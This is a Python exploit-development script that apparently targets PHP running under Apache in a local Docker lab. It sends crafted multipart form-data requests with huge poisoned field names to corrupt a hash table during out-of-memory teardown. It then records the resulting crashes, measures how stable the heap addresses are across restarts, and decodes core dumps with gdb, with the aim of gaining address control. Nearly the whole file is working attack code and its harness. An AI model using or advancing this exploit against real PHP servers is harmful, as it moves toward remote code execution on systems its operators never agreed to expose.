#!/usr/bin/env python3
"""oom60: ADDRESS CONTROL, take 2 — stamped poison + core decode + stability.

oom59c proved: stamped cell #30433 landed in dying-table slot 3956 (value
field) and cell #30434 in its hash field; 2 SIGSEGVs in-window. The dtor probe
never derefs poison, so the crash is the STOCK teardown path dereferencing the
fake pointer built from our bytes (type=122, refcounted flag set -> GC_DELREF
on 0x7a7a...).

oom60: (a) CoreDumpDirectory restored BEFORE fires; (b) parse FULL docker-logs
tail per fire (no prefix-slicing bug); (c) 6 fires + restart + 3 fires ->
stability table of (arData, slot addr, stamp); (d) gdb decode of fresh core.
"""
import re
import subprocess
import time
import urllib.request

LAB = "http://127.0.0.1:8081"
NAMELEN = 3064
LIB = "/usr/lib/apache2/modules/libphp.so"
PHPLAB = "/Users/vlad/Projects/queue/php2shell-lab"
HEXD = b"0123456789abcdef"
CELLS = 10237  # per poison name (163792 bytes)


def sh(cmd, timeout=25, retries=2):
    for _ in range(retries + 1):
        try:
            r = subprocess.run(["docker", "exec", "php_vuln", "sh", "-c", cmd],
                               capture_output=True, timeout=timeout)
            return (r.stdout.decode("latin1") + r.stderr.decode("latin1")[:150]).strip()
        except subprocess.TimeoutExpired:
            time.sleep(1)
    return "<<EXEC TIMEOUT>>"


def dcp(src, dst):
    return subprocess.run(["docker", "cp", src, dst], capture_output=True).returncode


def key_part(i):
    head = (b'--BOUND\r\nContent-Disposition: form-data; name="p' + b"K" * (NAMELEN - 8) +
            (b"%d" % i) + b'[x]"\r\n\r\n')
    return head + b"v\r\n"


def poison_part(n, stamp_offset):
    idx = stamp_offset
    body = bytearray()
    for _ in range(CELLS):
        stamp = bytes([HEXD[(idx >> (4 * (5 - k))) & 0xF] for k in range(6)])
        body += stamp + b"z" * 10
        idx += 1
    nm = b"q" + bytes(body) + (b"%06d" % n)
    return b'--BOUND\r\nContent-Disposition: form-data; name="' + nm + b'"\r\n\r\nv\r\n'


def build_attack(k1=2044, prep=3, stamp_base=0):
    ps = [key_part(i) for i in range(k1)]
    ps += [poison_part(n, stamp_base + n * CELLS) for n in range(prep)]
    ps += [key_part(i) for i in range(k1, 4200)]
    ps.append(b"--BOUND--\r\n")
    return b"".join(ps)


def http(path, body=None, ctype=None, timeout=40):
    req = urllib.request.Request(LAB + path, data=body)
    if ctype:
        req.add_header("Content-Type", ctype)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.status, ""
    except urllib.error.HTTPError:
        return "HTTP%s" % e.code, ""
    except Exception as e:
        return type(e).__name__, str(e)[:60]


def full_logs():
    r = subprocess.run(["docker", "logs", "php_vuln"], capture_output=True, timeout=120)
    return (r.stdout + r.stderr).decode("latin1", "replace")


W2RE = re.compile(
    r"W2 dtorH? slot=(\d+)/(\d+) at=0x([0-9a-f]+) arData=0x([0-9a-f]+) "
    r"type=(\d+) v0=([0-9a-f]+) k=([0-9a-f]+) h=([0-9a-f]+)")


def w2_lines(logs):
    out = []
    for m in W2RE.finditer(logs):
        out.append({
            "slot": int(m.group(1)), "nused": int(m.group(2)),
            "at": int(m.group(3), 16), "arData": int(m.group(4), 16),
            "type": int(m.group(5)), "v0": m.group(6), "k": m.group(7), "h": m.group(8),
        })
    return out


def stamp_of(h):
    raw = bytes.fromhex(h["v0"])[::-1]
    # slot starts 14B into a cell: cells are 16B, bucket val overlaps 2 cells,
    # observed payload = 2 tail bytes of cell N + 6-digit stamp of cell N+? ->
    # decode digits wherever the [0-9a-f]{6} run sits:
    m = re.search(rb"[0-9a-f]{6}", raw)
    return m.group(0).decode() if m else raw[:6].decode("latin1", "replace")


def main():
    print("=== [0] lab env + w2 swap + CORE CAPTURE ON ===", flush=True)
    dcp(PHPLAB + "/oomlab.ini", "php_vuln:/usr/local/etc/php/conf.d/30-oomlab.ini")
    sh("grep -q PHPRC /etc/apache2/envvars || echo 'export PHPRC=/usr/local/etc/php/conf.d/30-oomlab.ini' >> /etc/apache2/envvars")
    sh("printf 'CoreDumpDirectory /tmp\\n' > /etc/apache2/conf-enabled/oomcore.conf")
    sh("rm -f /tmp/core*")
    dcp(PHPLAB + "/libphp.so.w2", "php_vuln:" + LIB)
    subprocess.run(["docker", "restart", "php_vuln"], capture_output=True)
    probe = "?"
    for _ in range(25):
        time.sleep(1.5)
        probe = sh("curl -s -m 5 http://127.0.0.1/oom_sapi.php", 10, 1)
        if "lim=20600000" in probe:
            break
    print("[ini]", probe, flush=True)
    if "lim=20600000" not in probe:
        print("[ABORT]", flush=True)
        return

    base_segv = len(re.findall(r"exit signal Segmentation", full_logs()))
    base_w2 = len(w2_lines(full_logs()))
    print("[baseline] segv=%d w2dtor=%d" % (base_segv, base_w2), flush=True)

    att = build_attack()
    print("[attack]", len(att), "bytes", flush=True)

    print("=== [1] 6 fires ===", flush=True)
    table = []
    for i in range(6):
        code, _ = http("/oom_mod.php", att, "multipart/form-data; boundary=BOUND")
        time.sleep(2)
        logs = full_logs()
        segv = len(re.findall(r"exit signal Segmentation", logs))
        rows = w2_lines(logs)
        new_rows = rows[base_w2:]
        base_w2 = len(rows)
        stamped = [r for r in new_rows if re.search(rb"[0-9a-f]{6}", stamp_of(r).encode()) and r["type"] > 10]
        print("  fire%d: %s segv+=%d w2dtor+=%d stamped=%d"
              % (i, code, segv - base_segv, len(new_rows), len(stamped)), flush=True)
        base_segv = segv
        for r in stamped[:2]:
            print("    slot=%d at=0x%x arData=0x%x type=%d stamp=%s next=%s"
                  % (r["slot"], r["at"], r["arData"], r["type"], stamp_of(r),
                     r["h"][:8]), flush=True)
            table.append(r)

    print("=== [2] restart + 3 fires ===", flush=True)
    subprocess.run(["docker", "restart", "php_vuln"], capture_output=True)
    for _ in range(15):
        time.sleep(1.5)
        http("/oom_sapi.php", timeout=5)
    for i in range(3):
        code, _ = http("/oom_mod.php", att, "multipart/form-data; boundary=BOUND")
        time.sleep(2)
        logs = full_logs()
        segv = len(re.findall(r"exit signal Segmentation", logs))
        rows = w2_lines(logs)
        new_rows = rows[base_w2:]
        base_w2 = len(rows)
        stamped = [r for r in new_rows if re.search(rb"[0-9a-f]{6}", stamp_of(r).encode()) and r["type"] > 10]
        print("  rst%d: %s segv+=%d w2dtor+=%d stamped=%d"
              % (i, code, segv - base_segv, len(new_rows), len(stamped)), flush=True)
        base_segv = segv
        for r in stamped[:2]:
            print("    slot=%d at=0x%x arData=0x%x type=%d stamp=%s next=%s"
                  % (r["slot"], r["at"], r["arData"], r["type"], stamp_of(r),
                     r["h"][:8]), flush=True)
            table.append(r)

    print("=== [3] stability ===", flush=True)
    ardata = sorted({r["arData"] for r in table})
    ats = sorted({r["at"] for r in table})
    stamps = sorted({stamp_of(r) for r in table})
    print("fires-with-stamped-slot=%d distinct arData=%d distinct at=%d distinct stamp=%d"
          % (len(table), len(ardata), len(ats), len(stamps)), flush=True)
    print(" arData:", ["0x%x" % a for a in ardata], flush=True)
    print(" at    :", ["0x%x" % a for a in ats], flush=True)
    print(" stamps:", stamps, flush=True)

    print("=== [4] core decode ===", flush=True)
    ls = sh("ls -la /tmp/core* 2>/dev/null", 15, retries=1)
    print("[cores]", ls, flush=True)
    if ls.startswith("/tmp/core"):
        corep = ls.split()[-1]
        dcp("php_vuln:%s" % corep, PHPLAB + "/child.core.60")
        open("/tmp/g60.gdb", "w").write(
            "set pagination off\nbt 8\ninfo registers rip rdi rsi rax rbx\n"
            "p $_siginfo._sifields._sigfault.si_addr\nx/3i $pc\n")
        subprocess.run(["docker", "cp", PHPLAB + "/child.core.60", "phpbuild:/tmp/child.core.60"],
                       capture_output=True)
        r = subprocess.run(["docker", "exec", "phpbuild", "sh", "-c",
                            "gdb -q -batch -x /tmp/g60.gdb /tmp/libphp.so /tmp/child.core.60 2>&1 | tail -40"],
                           capture_output=True, timeout=180)
        print(r.stdout.decode("latin1", "replace")[-2200:], flush=True)

    print("=== [5] restore stock ===", flush=True)
    sh("cp /tmp/libphp.so.stock %s" % LIB, 20)
    sh("rm -f /usr/local/etc/php/conf.d/30-oomlab.ini /etc/apache2/conf-enabled/oomcore.conf /tmp/core*")
    sh("sed -i '/PHPRC/d' /etc/apache2/envvars")
    subprocess.run(["docker", "restart", "php_vuln"], capture_output=True)
    for _ in range(15):
        time.sleep(1.5)
        http("/oom_sapi.php", timeout=5)
    print("[restored]", sh("md5sum %s | cut -c1-8" % LIB, 15),
          sh("curl -s -m 5 http://127.0.0.1/oom_sapi.php", 10, 1), flush=True)


if __name__ == "__main__":
    main()
